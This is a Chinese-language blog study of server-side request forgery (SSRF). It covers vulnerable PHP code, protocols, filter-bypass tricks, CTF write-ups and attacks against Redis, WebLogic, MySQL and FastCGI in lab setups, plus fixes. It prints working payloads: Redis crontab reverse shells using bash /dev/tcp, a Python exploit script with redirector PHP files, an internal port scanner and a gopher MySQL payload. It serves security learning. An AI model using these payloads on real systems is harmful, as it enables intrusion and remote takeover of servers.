[![img](https://yoga7xm.top/2018/11/15/ssrf-study/attack.png)](https://yoga7xm.top/2018/11/15/ssrf-study/attack.png)

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/cltas.png)](https://yoga7xm.top/2018/11/15/ssrf-study/cltas.png)

直接getshell

其中，如果利用Dict协议提交时，会自动在末尾加上`\r\n`，所以需一步一步的发送请求来构造Exp

```
dict://127.0.0.1:6379/config:set:dir:/var/spool/cron
dict://127.0.0.1:6379/config:set:dbfilename:root
dict://127.0.0.1:6379/set:1:nn*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1nn
dict://127.0.0.1:6379/save
7269:M 14 Nov 04:36:09.170 * DB loaded from disk: 0.017 seconds
7269:M 14 Nov 04:36:09.171 * Ready to accept connections
7269:M 14 Nov 04:37:45.848 * DB saved on disk
```

此处利用创宇404师傅[SSRF漏洞分析与利用](http://www.4o4notfound.org/index.php/archives/33/) 根据乌云猪猪侠改造的Exp

```
# ssrf.py
import requests
host = '104.224.151.234'
port = '6379'
bhost = 'www.4o4notfound.org'
bport=2333
vul_httpurl = 'http://www.4o4notfound.org/ssrf.php?url='
_location = 'http://www.4o4notfound.org/302.php'
shell_location = 'http://www.4o4notfound.org/shell.php'
#1 flush db
_payload = '?s=dict%26ip={host}%26port={port}%26data=flushall'.format( host = host, port = port)
exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
print exp_uri
print requests.get(exp_uri).content
#set crontab command
_payload = '?s=dict%26ip={host}%26port={port}%26bhost={bhost}%26bport={bport}'.format( host = host, port = port, bhost = bhost, bport = bport)
exp_uri = '{vul_httpurl}{0}{1}'.format(shell_location, _payload, vul_httpurl=vul_httpurl)
print exp_uri 
print requests.get(exp_uri).content
#confg set dir
_payload='?s=dict%26ip={host}%26port={port}%26data=config:set:dir:/var/spool/cron/'.format( host = host, port = port)
exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
print exp_uri
print requests.get(exp_uri).content
#config set dbfilename
_payload='?s=dict%26ip={host}%26port={port}%26data=config:set:dbfilename:root'.format( host = host, port = port)
exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
print exp_uri
print requests.get(exp_uri).content
#save
_payload='?s=dict%26ip={host}%26port={port}%26data=save'.format( host = host, port = port)
exp_uri = '{vul_httpurl}{0}{1}'.format(_location, _payload, vul_httpurl=vul_httpurl)
print exp_uri
print requests.get(exp_uri).content


#302.php
<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$scheme = $_GET['s'];
$data = $_GET['data'];
header("Location: $scheme://$ip:$port/$data"); ?>

#shell.php
<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$bhost = $_GET['bhost'];
$bport = $_GET['bport'];
$scheme = $_GET['s'];
header("Location: $scheme://$ip:$port/set:0:"\x0a\x0a*/1\x20*\x20*\x20*\x20*\x20/bin/bash\x20-i\x20>\x26\x20/dev/tcp/{$bhost}/{$bport}\x200>\x261\x0a\x0a\x0a""); ?>

执行ssrf.py 即可写入crontab，在本地开启nc监听等待请求
```

### Weblogic SSRF 漏洞

**环境搭建：**

直接从开源的[vulhub](https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf)获取文件，然后进行编译启动

```
docker-compose build
docker-compose up -d
```

完成后访问存在漏洞的页面`http://192.168.1.166:7001/uddiexplorer/SearchPublicRegistries.jsp`即可

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/weblogic.png)](https://yoga7xm.top/2018/11/15/ssrf-study/weblogic.png)

访问一个URL，其中`ip:port`开放

```
http://192.168.1.166:7001/uddiexplorer/SearchPublicRegistries.jsp
?rdoSearch=name
&txtSearchname=sdf
&txtSearchkey=
&txtSearchfor=
&selfor=Business+location
&btnSubmit=Search
&operator=http://127.0.0.1:7001
```

返回 一个`404 error code`

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/7001.png)](https://yoga7xm.top/2018/11/15/ssrf-study/7001.png)

假如访问一个未开放的端口`9999`，

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/9999.png)](https://yoga7xm.top/2018/11/15/ssrf-study/9999.png)

返回一个`could not connect`，

假如访问其他协议，dict、gopher

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/gopher.png)](https://yoga7xm.top/2018/11/15/ssrf-study/gopher.png)

返回`unknown protocol`

可以通过错误的不同，可探测内网状态。

一个简单的扫描内网端口的POC

```
import requests
url = "http://192.168.1.166:7001/uddiexplorer/SearchPublicRegistries.jsp"
ports = [6378,6379,22,25,80,8080,8888,8000, 7001, 7002,23,25,3306,2333]
for i in range(1,255):
	for port in ports:
		params = dict(
			rdoSearch = "name",
			txtSearchname = "sdf",
			selfor = "Business+location",
			btnSubmit = "Search",
			operator = "http://172.18.0.{}:{}".format(i,port))
		try:
			r = requests.get(url, params=params, timeout = 3)
		except:
			pass
        
		if 'could not connect over HTTP to server' not in r.text and 'No route to host' not in r.text:
			print('[*] http://172.18.0.{}:{}'.format(i,port))
		else:
			pass
```

结果

```
[*] http://172.18.0.3:22
[*] http://172.18.0.3:80
[*] http://172.18.0.3:8888
[*] http://172.18.0.3:7001
[*] http://172.18.0.3:6379
```

**攻击Redis反弹shell**

Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入`%0a%0d`来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。

redis反弹shell Exp：

```
test

set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/172.18.0.1/2333 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save

aaa
```

将其URL编码,其中`\r\n`编码后为`%0D%0A`

```
test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F2333%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
```

然后提交，成功getshell

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/root.png)](https://yoga7xm.top/2018/11/15/ssrf-study/root.png)

此外，redis启动时不会像apache一样，以一种低权限的身份运行，而是取决于运行他的用户的权限，而且它的默认配置是不需要密码的，故默认的未授权访问，并且它也支持本地存储，所以这就造成了任意文件写入漏洞，写入webshell、ssh私钥等

------

## 0x05 漏洞修复

1. 仅仅限制http、https协议
2. 禁止302跳转
3. 设置URL白名单或限制内网IP
4. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态
5. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准
6. 限制请求的端口为http常用的端口，比如，80,443,8080,8090

------

## 0x06 Bypass Tips

1. 最常用的跳转绕过

 一些服务器可能限定了只能使用http和https，这样就能通过header跳转绕过

```
<?php  
	header("Location: file:///etc/passwd");
?>
<?php  
	header("Location: dict://127.0.0.1:6379/info");
?>
<?php  
	header("Location: gopher://127.0.0.1:6666/_info");
?>
```

1. 指向任意IP的域名xip.io

```
10.0.0.1.xip.io   resolves to   10.0.0.1
www.10.0.0.1.xip.io   resolves to   10.0.0.1
mysite.10.0.0.1.xip.io   resolves to   10.0.0.1
foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1
```

1. IP限制绕过，十进制、八进制、十六进制之间的互相转换
2. 短网址绕过

```
http://dwz.cn/11SMa  >>>  http://127.0.0.1
```

- SSRF 学习记录
  - [漏洞场景](#漏洞场景)
  - [漏洞验证](#漏洞验证)
  - [工具](#工具)
  - 协议
    - [file协议](#file协议)
    - [dict协议](#dict协议)
    - [ftp、ftps](#ftp、ftps)
    - [tftp](#tftp)
    - [imap/imaps/pop3/pop3s/smtp/smtps](#imapimapspop3pop3ssmtpsmtps)
    - [telnet](#telnet)
    - [smb/smbs](#smbsmbs)
    - [Gopher](#Gopher)
  - PHP漏洞代码
    - [curl造成的SSRF](#curl造成的SSRF)
    - [file_get_contents造成的SSRF](#file_get_contents造成的SSRF)
    - [fsockopen造成的SSRF](#fsockopen造成的SSRF)
  - [利用方式](#利用方式)
  - 绕过技巧
    - [更改IP地址写法](#更改IP地址写法)
    - [利用解析URL所出现的问题](#利用解析URL所出现的问题)
    - [利用302跳转](#利用302跳转)
    - [通过各种非HTTP协议](#通过各种非HTTP协议)
    - [DNS rebinding](#DNS-rebinding)
  - 实例
    - [LCTF-2017-签到题](#LCTF-2017-签到题)
    - [XMAN-SimpleSSRF](#XMAN-SimpleSSRF)
    - [NCTF-2018-Hard Php](#NCTF-2018-Hard-Php)
    - [LCTF-2018-bestphp's revenge](#LCTF-2018-bestphps-revenge)
    - [34c3ctf-extract0r](#34c3ctf-extract0r)
    - [Gopher 攻击mysql](#Gopher-攻击mysql)
    - [Gopher攻击FastCGI](#Gopher攻击FastCGI)
    - [Gopher 攻击Redis（一）](#Gopher-攻击Redis（一）)
    - [攻击Redis（二）](#攻击Redis（二）)
  - [修复方案](#修复方案)



![img](https://i.imgur.com/jAtTFop.png)

![img](https://i.imgur.com/mlpNLtN.png)

[猪猪侠乌云白帽大会SSRF经典议程](http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf)

SSRF（服务器端请求伪造）测试资源
 https://paper.seebug.org/393/
 https://github.com/cujanovic/SSRF-Testing
 SSRF 圣经
 https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM

【Blackhat】SSRF的新纪元：在编程语言中利用URL解析器
 https://www.anquanke.com/post/id/86527
 https://www.youtube.com/watch?v=D1S-G8rJrEk
 【Blackhat】从SSRF执行链到RCE，看我如何利用GitHub企业版中的四个漏洞
 https://www.anquanke.com/post/id/86517
 【BlackHat 2017 议题剖析】连接的力量：GitHub 企业版漏洞攻击链构造之旅
 https://paper.seebug.org/363/

SSRF Tips
 http://blog.safebuff.com/2016/07/03/SSRF-Tips/

http://www.91ri.org/17111.html
 了解SSRF,这一篇就足够了
 https://xz.aliyun.com/t/2115
 SSRF攻击文档翻译
 https://xz.aliyun.com/t/2421
 SSRF-Lab
 https://github.com/m6a-UdS/ssrf-lab

从CTF中学习SSRF
 http://hwhxy.space/2018/08/09/从CTF中学习SSRF.html

SSRF injection总结得很全面的资料
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF injection#summary

some trick in ssrf
 http://skysec.top/2018/03/15/Some trick in ssrf and unserialize()/#trick2-libcurl-and-parse-url

PHP的libcurl中存在的一些问题
 http://wonderkun.cc/index.html/?p=670

parse_url 函数trick
 https://github.com/jiangsir404/Audit-Learning/blob/master/parse_url 函数trick.md

SSRF漏洞中绕过IP限制的几种方法总结
 https://www.freebuf.com/articles/web/135342.html

SSRF绕过方法总结
 https://www.secpulse.com/archives/65832.html

All you need to know about SSRF and how may we write tools to do auto-detect
 http://www.auxy.xyz/paper/post/all-ssrf-knowledge/
 https://medium.com/bugbountywriteup/the-design-and-implementation-of-ssrf-attack-framework-550e9fda16ea

利用redis写webshell
 https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html

Redis和SSRF
 https://xz.aliyun.com/t/1800

SSRF漏洞(原理&绕过姿势)(php,java,python例子)
 https://www.t00ls.net/articles-41070.html

浅析SSRF原理及利用方式
 https://www.anquanke.com/post/id/145519

SSRF利用
 https://hellohxk.com/blog/ssrf/

Gopher SSRF攻击内网应用复现
 https://www.smi1e.top/gopher-ssrf攻击内网应用复现/
 https://joychou.org/web/phpssrf.html
 https://paper.seebug.org/510/#01
 利用 Gopher 协议拓展攻击面
 https://blog.chaitin.cn/gopher-attack-surfaces/

Python安全 - 从SSRF到命令执行惨案
 https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html

## 漏洞场景

了解了漏洞的原理后，我们知道**所有能发起请求的地方**都可能会存在SSRF漏洞，我们可以根据“漏洞代码”中的常见方法对项目进行自查。以下列举一些最容易出现本漏洞的场景：

能填写链接的地方

- 业务场景
- 从URL上传图片
- 订阅RSS
- 爬虫
- 预览
- 离线下载

数据库内置功能

- Oracle
- MongoDB
- MSSQL
- Postgres
- CouchDB

邮箱服务器收取其他邮箱邮件

- POP3/IMAP/SMTP

文件处理、编码处理、属性处理

- FFmpeg
- ImageMagick
- Docx
- PDF
- XML

![QQ邮箱](https://i.imgur.com/HiviuFE.png)

## 漏洞验证

1.排除法：浏览器f12查看源代码看是否是在本地进行了请求

比如：该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞

2.dnslog等工具或者使用`http://ceye.io`进行测试，看是否被访问

–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。

3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址

–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址

–通过二级域名暴力猜解工具模糊猜测内网地址

4.直接返回的Banner、title、content等信息

5.留意bool型SSRF

## 工具

SSRFmap - https://github.com/swisskyrepo/SSRFmap
 Gopherus - https://github.com/tarunkant/Gopherus
 shellver - https://github.com/0xR0/shellver

## 协议

### file协议

读取服务器上任意文件内容

### dict协议

可以用来操作内网Redis等服务

### ftp、ftps

FTP匿名访问、爆破

### tftp

UDP协议扩展

### imap/imaps/pop3/pop3s/smtp/smtps

爆破邮件用户名密码

### telnet

SSH/Telnet匿名访问及爆破

### smb/smbs

SMB匿名访问及爆破

### Gopher

Gopher 协议在SSRF中属于万金油，可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求，还可以攻击内网未授权MySQL。

Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法很简单，与http协议很类似。
 不同的点在于gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用`%0d%a`。注意post参数之间的&分隔符也要进行url编码
 基本协议格式：`URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流`

使用gopher协议构造post包的方法
 https://www.th1s.cn/index.php/2016/10/31/15.html

实际测试以及阅读文章中发现gopher存在以下几点问题

1. PHP的curl默认不跟随302跳转
2. curl7.43gopher协议存在%00截断的BUG，v7.45以上可用
3. file_get_contents()的SSRF，gopher协议不能使用URLencode
4. file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败

## PHP漏洞代码

### curl造成的SSRF

```
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}

$url = $_GET['url'];
curl($url);  
```

### file_get_contents造成的SSRF

```
$url = $_GET['url'];;
echo file_get_contents($url);
```

### fsockopen造成的SSRF

```
function GetFile($host,$port,$link) 
{ 
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
    if (!$fp) 
    { 
        echo "$errstr (error number $errno) \n"; 
    } 
    else 
    { 
        $out = "GET $link HTTP/1.1\r\n"; 
        $out .= "Host: $host\r\n"; 
        $out .= "Connection: Close\r\n\r\n"; 
        $out .= "\r\n"; 
        fwrite($fp, $out); 
        $contents=''; 
        while (!feof($fp)) 
        { 
            $contents.= fgets($fp, 1024); 
        } 
        fclose($fp); 
        return $contents; 
    } 
}
```

## 利用方式

1. 利用redis从而RCE
2. 探测并利用内网struts2漏洞
3. 利用gopher://协议，在php-fpm里执行任意代码
4. 利用redis/memcache里存储的数据，反序列化或权限绕过
5. 利用phar://协议来触发反序列化漏洞
6. 利用file://协议读取本地文件

soap导致的SSRF
 https://xz.aliyun.com/t/2960
 题目：https://xz.aliyun.com/t/2148

SOAP及相关漏洞研究
 https://skysec.top/2018/08/17/SOAP及相关漏洞研究

Python安全 - 从SSRF到命令执行惨案 Python安全 - [从SSRF到命令执行惨案 | 离别歌](https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html)

利用ssrf攻击内网fpm Do Evil Things with gopher://
 https://paper.tuisec.win/detail/a87f0565b628bac

利用ssrf攻击内网mysql 从一道CTF题目看Gopher攻击MySql
 https://paper.tuisec.win/detail/aed0bb56df25952

SSRF配合一些云服务器的特点来GetShell, 如这个：[HackerOne](https://hackerone.com/reports/401136)

[通过SSRF漏洞攻击Docker远程API获取服务器Root权限](https://www.freebuf.com/articles/web/179910.html)

搜狗某内网存在Struts2命令执行（discuz!应用实例） Wooyun
 http://www.secevery.com:4321/bugs/wooyun-2015-0151181

案例 bilibili某分站从信息泄露到ssrf再到命令执行 https://wy.tuisec.win/wooyun-2016-0213982.html

案例 Vanilla论坛利用getimagesize进行phar反序列化导致RCE
 https://xz.aliyun.com/t/3190
 Phar与Stream Wrapper造成PHP RCE的深入挖掘
 https://blog.zsxsoft.com/post/38
 例题：LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析
 https://www.anquanke.com/post/id/164818

案例 百度某个从SSRF到内网WebShell https://wy.tuisec.win/wooyun-2015-099070.html

案例 `SSRF in https://imgur.com/vidgif/url`
 https://hackerone.com/reports/115748

案例 利用NodeJS SSRF漏洞获取AWS完全控制权限
 https://xz.aliyun.com/t/2871

## [绕过技巧](https://www.secpulse.com/archives/65832.html)

### 更改IP地址写法

例如192.168.0.1

```
(1)、8进制格式：0300.0250.0.1

(2)、16进制格式：0xC0.0xA8.0.1

(3)、10进制整数格式：3232235521

(4)、16进制整数格式：0xC0A80001
```

还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1

```
1.  http://0/
2.  http://127.1/
3. 利用ipv6绕过，http://[::1]/
4.  http://127.0.0.1./
```

### 利用解析URL所出现的问题

在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。

http://www.baidu.com@192.168.0.1/与http://192.168.0.1请求的都是192.168.0.1的内容

### 利用302跳转

(1)[http://xip.io和xip.name当我们访问这个网站的子域名的时候](http://xip.xn--ioxip-sn9h.xn--name-of5f63biydk1mq9iy1iyolyiiqtndp0dda358ow2roy6c9jqyv2a)，[例如192.168.0.1.xip.io](http://xn--192-uc0ep96b.168.0.1.xip.io)，就会自动重定向到192.168.0.1。

```
10.0.0.1.xip.io 10.0.0.1

www.10.0.0.1.xip.io 10.0.0.1

mysite.10.0.0.1.xip.io 10.0.0.1

foo.bar.10.0.0.1.xip.io 10.0.0.1

10.0.0.1.xip.name  resolves to  10.0.0.1

www.10.0.0.2.xip.name  resolves to  10.0.0.2

foo.10.0.0.3.xip.name  resolves to  10.0.0.3

bar.baz.10.0.0.4.xip.name  resolves to  10.0.0.4
```

(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过用短地址的方式绕过

https://tinyurl.com/

### 通过各种非HTTP协议

### DNS rebinding

DNS重绑定可以利用于ssrf绕过 ，bypass 同源策略等

我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。

```
服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP

对于获得的IP进行判断，发现为非黑名单IP，则通过验证

服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。

由于已经绕过验证，所以服务器端返回访问内网资源的结果。
```

[关于DNS-rebinding的总结](http://www.bendawang.site/2017/05/31/关于DNS-rebinding的总结/)

## 实例

### LCTF-2017-签到题

```
<?php 
if(!$_GET['site']){ 
	$str = <<<EOD
<html> 
<body> 
look source code: 
<form action='' method='GET'> 
<input type='submit' name='submit' /> 
<input type='text' name='site' style="width:1000px" value="https://www.baidu.com"/> 
</form>
</body>
</html>
EOD;

echo $str;
	die(); 
}

$url = $_GET['site']; 
$url_schema = parse_url($url); 
$host = $url_schema['host']; 
$request_url = $url."/"; 

if ($host !== 'www.baidu.com'){ 
	die("wrong site"); 
}

$ci = curl_init();
curl_setopt($ci, CURLOPT_URL, $request_url);
curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
$res = curl_exec($ci);
curl_close($ci);

if($res){ 
	echo "<h1>Source Code:</h1>"; 
	echo $request_url; 
	echo "<hr />"; 
	echo htmlentities($res); 
}else{ 
	echo "get source failed"; 
} 

?>
```

知识点

- 用file协议读取本地文件
- 绕过逻辑中对host的检查, curl是支持file://host/path, file://path这两种形式, 但是即使有host, curl仍然会访问到本地的文件
- 截断url后面拼接的/, GET请求, 用?#都可以

payload

```
file://www.baidu.com/etc/flag?
```

### XMAN-SimpleSSRF

```
<?php

/*
 * I stored flag at baidu.com
 */

show_source(__FILE__);

if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(!$url){
        die('Can not parse url: '.$_GET['url']);
    }
    if(substr($_GET['url'], strlen('http://'), strlen('baidu.com')) === 'baidu.com'){
        die('Hey, papi, you have to bypass this!');
    }
    if(
        $url['host'] === 'baidu.com'
    ){
        $ch = curl_init();
        curl_setopt ($ch, CURLOPT_URL, $_GET['url']);
        curl_exec($ch);
        curl_close($ch);
    }else{
        die('Save it, hacker!');
    }
}
```

知识点

- file协议
- 匹配规则

```
php parse_url：
host: 匹配最后一个@后面符合格式的host

libcurl：
host：匹配第一个@后面符合格式的host
```

![img](https://i.imgur.com/nDbtZfH.png)

题目告诉你存在一个flag,要输入一个url。
 判断`url[7:15]`是不是等于`baidu.com`，并且要让parse_url()处理过后的得到的`url['host']`强等于`baidu.com`,然后回去curl你输入的网址。

好的我们现在来梳理一下，如果正常的输入`http://baidu.com/flag`,则过不了第一个判断，因为提取出来的url`[7:15]===baidu.com`

如果输入`http://eval.com`则能过第一个，但是过不了第二个，因为`url[‘host’]===eval.com`，所以这里的焦点放在了parse_url上

如何让parse_url提取的`url[‘host’]==baidu.com`，又能让`url[7:15]!=baidu.com`呢，

@符号之前表示user成分，如果有pass,则用:分割虽然这样没有安全性可言,但是这确实是设计url中的一环.
 payload

```
file://@baidu.com/flag
```

### NCTF-2018-Hard Php

题目环境：https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php

https://xz.aliyun.com/t/2148

### LCTF-2018-bestphp's revenge

题目环境：https://github.com/LCTF/LCTF2018/tree/master/Writeup/babyphp's revenge

https://www.anquanke.com/post/id/164569#h2-5
 https://xz.aliyun.com/t/3336

### 34c3ctf-extract0r

题目环境：https://github.com/eboda/34c3ctf/tree/master/extract0r

### Gopher 攻击mysql

#### MySQL连接方式：

在进行利用SSRF攻击MySQL之前，先了解一下MySQL的通信协议。MySQL分为服务端和客户端，客户端连接服务器使存在三种方法：

- Unix套接字；
- 内存共享/命名管道；
- TCP/IP套接字；

在Linux或者Unix环境下，当我们输入mysql–uroot –proot登录MySQL服务器时就是用的Unix套接字连接；Unix套接字其实不是一个网络协议，只能在客户端和Mysql服务器在同一台电脑上才可以使用。

在window系统中客户端和Mysql服务器在同一台电脑上，可以使用命名管道和共享内存的方式。

TCP/IP套接字是在任何系统下都可以使用的方式，也是使用最多的连接方式，当我们输入mysql–h127.0.0.1 –uroot –proot时就是要TCP/IP套接字。

所以当我们需要抓取mysql通信数据包时必须使用TCP/IP套接字连接。

#### MySQL认证过程：

MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。

MySQL客户端与服务器的交互主要分为两个阶段：Connection Phase（连接阶段或者叫认证阶段）和Command Phase（命令阶段）。在连接阶段包括握手包和认证包，这里我们不详细说明握手包，主要关注认证数据包。

认证数据包格式如下：
 ![img](https://i.imgur.com/HdDjdxe.png)

#### 开始

环境使用mattrayner/lamp:latest-1604-php7 docker
 ![img](https://i.imgur.com/uAy5BKH.png)

```
root@487d27afcad1:/# uname -a
Linux 487d27afcad1 4.10.4-1.el7.elrepo.x86_64 #1 SMP Sat Mar 18 12:50:10 EDT 2017 x86_64 x86_64 x86_64 GNU/Linux

root@487d27afcad1:/# curl -V
curl 7.47.0 (x86_64-pc-linux-gnu) libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp
Features: AsynchDNS IDN IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz TLS-SRP UnixSockets

root@487d27afcad1:/# mysql -V
mysql  Ver 14.14 Distrib 5.7.23, for Linux (x86_64) using  EditLine wrapper

root@487d27afcad1:/# php -v
PHP 7.2.9-1+ubuntu16.04.1+deb.sury.org+1 (cli) (built: Aug 19 2018 07:16:12) ( NTS )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.2.9-1+ubuntu16.04.1+deb.sury.org+1, Copyright (c) 1999-2018, by Zend Technologies
    with Xdebug v2.6.0, Copyright (c) 2002-2018, by Derick Rethans
```

创建数据库

```
mysql> create database flag;
Query OK, 1 row affected (0.01 sec)

mysql> use flag;
Database changed
mysql> create table flag(flag varchar(30) not null);
Query OK, 0 rows affected (0.03 sec)

mysql> INSERT INTO flag VALUES('flag{gopher_i3_Vu1n3rab13}');
Query OK, 1 row affected (0.04 sec)
```

使用[gopherus](https://github.com/tarunkant/Gopherus)生成payload
 ![img](https://i.imgur.com/4s1Z1i4.png)

![img](https://i.imgur.com/SpDmDbc.png)

线上测试

index.php

```
<?php
$url = @$_GET['url'];
if($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $co = curl_exec($ch);
    curl_close($ch);
    echo $co;
}
?>
```

注意：如果ssrf的点是get参数，因为处于url中，则需要进行一次url编码，上述例子将会编码成：

```
http://xx.xx.xx.xx/?url=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%251d%2500%2500%2500%2503%2575%2573%2565%2520%2566%256c%2561%2567%253b%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2566%256c%2561%2567%253b%2501%2500%2500%2500%2501
```

![img](https://i.imgur.com/5ruYMEx.png)

很多情况下，SSRF是没有回显的。
 我们可以通过mysql执行select into outfile，当前用户必须存在file权限，以及导出到`secure_file_priv`指定目录下，并且导入目录需要有写权限。
 还可以通过udf反弹shell直接执行系统命令。
 原理都是利用SSRF拿Gopher协议发送构造好的TCP/IP数据包攻击mysql

因为docker设置了`secure_file_priv=/var/lib/mysql-files/`，偷懒就没有改了，

![img](https://i.imgur.com/A0dG2xU.png)

![img](https://i.imgur.com/OqHDJ9j.png)

![img](https://i.imgur.com/DhJhNRf.png)

也可以去读取mysql的配置文件

```
select LOAD_FILE('/etc/mysql/mysql.conf.d/mysqld.cnf');
```

看用户权限

```
select * from information_schema.user_privileges;
```

#### 利用udf提权反弹shell

https://coomrade.github.io/2018/10/28/SSRF攻击MySQL/
 http://vinc.top/2017/04/19/mysql-udf提权linux平台/

![img](https://i.imgur.com/7nyoAmr.png)

![img](https://i.imgur.com/dgMs8WG.png)

![img](https://i.imgur.com/llfvzwR.png)

因为mattrayner/lamp修改`secure-file-priv`失败使用了另外一个docker

docker run –rm -it  -p 83:80 -v `pwd`/www:/app janes/alpine-lamp bash

![img](https://i.imgur.com/msRcgAJ.png)

![img](https://i.imgur.com/SbomXte.png)

![img](https://i.imgur.com/t2ulzbu.png)
 需要将my.ini中的skip-grant-tables选项去掉。

docker修改配置有点麻烦，不知道哪个才是真的配置文件，以后总结一下再来复现2333

UDF提权tips
 https://bbs.ichunqiu.com/thread-39697-1-1.html

### Gopher攻击FastCGI

一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。

p神介绍FastCGI的文章：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
 实验环境：https://github.com/vulhub/vulhub/tree/master/fpm
 利用条件

- libcurl版本>=7.45.0(由于EXP里有%00，CURL版本小于7.45.0的版本，gopher的%00会被截断)
